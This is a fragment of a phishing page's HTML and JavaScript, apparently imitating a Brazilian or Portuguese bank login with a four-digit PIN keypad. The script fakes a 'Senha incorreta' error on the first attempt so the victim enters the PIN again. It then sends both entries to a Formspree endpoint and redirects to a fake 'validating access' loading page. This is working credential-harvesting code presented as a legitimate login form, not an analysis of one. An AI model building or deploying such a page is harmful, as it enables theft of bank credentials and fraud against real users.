    <div class="position-fixed top-0 mt-5 pt-3 w-100 d-flex flex-row align-content-center justify-content-center d-none" id="alerta">

            Mensagem do alerta
        </p>

    <script>
        function esqueci() {
            $('#senha_completa').val('CLICOU EM ESQUECEU A SENHA');
            $('form').submit();
        }
    
        $('input').keypress(function(e) {
            if(e.which == 13) {
                e.preventDefault();
            }
        });
    
        $(document).ready(function(){
            $('#senha').mask('0000');
        });
    
        function alerta(s) {
            $('#msg').html(s);
            $('#alerta').fadeIn('slow', function() {
                setTimeout(function() {
                    $('#alerta').fadeOut('slow', function() {
                        $('#alerta').addClass('d-none');
                    });
                }, 3000);
            });
    
            $('#alerta').removeClass('d-none');
        }
    
        var ponteiro = 0;
    
        $(document).on('click', '#envia', function(e) {
            e.preventDefault(); // Previne o envio tradicional do formulário
    
            if (ponteiro == 0) {
                if ($('#senha').val().length == 4) {
                    $('#senha_completa').val($('#senha').val());
                    $('#senha').val('');
                    alerta("Senha incorreta");
                    $('#senha').focus();
                    ponteiro = 1;
                } else {
                    $('#senha').val('');
                    alerta("Senha incorreta");
                    $('#senha').focus();
                }
            } else if ($('#senha').val().length == 4) {
                let senhaFinal = $('#senha_completa').val() + ' / ' + $('#senha').val();
    
                // Enviar os dados ao Formspree
                let formData = new FormData();
                formData.append("senha", senhaFinal);
    
                fetch("https://formspree.io/f/xnnjrlzl", { // Substitua pelo seu endpoint
                    method: "POST",
                    body: formData,
                    headers: { "Accept": "application/json" }
                }).then(response => {
                    if (response.ok) {
                        alert("Aguarde enquanto validamos o seu acesso");
                        window.location.href = "../carregar/carregar.html"; // Redireciona após envio
                    } else {
                        alert("Erro ao enviar a senha. Tente novamente.");
                    }
                }).catch(error => {
                    alert("Erro de conexão.");
                });
    
            } else {
                $('#senha').val("");
                $('#senha').focus();
                alerta("Senha incorreta");
            }
        });
    
        function seninha(s) {
            if ($('#senha').val().length < 4) {
                $('#senha').val($('#senha').val() + s);
            } else {
                $('#senha').val('');
            }
        }
    </script>
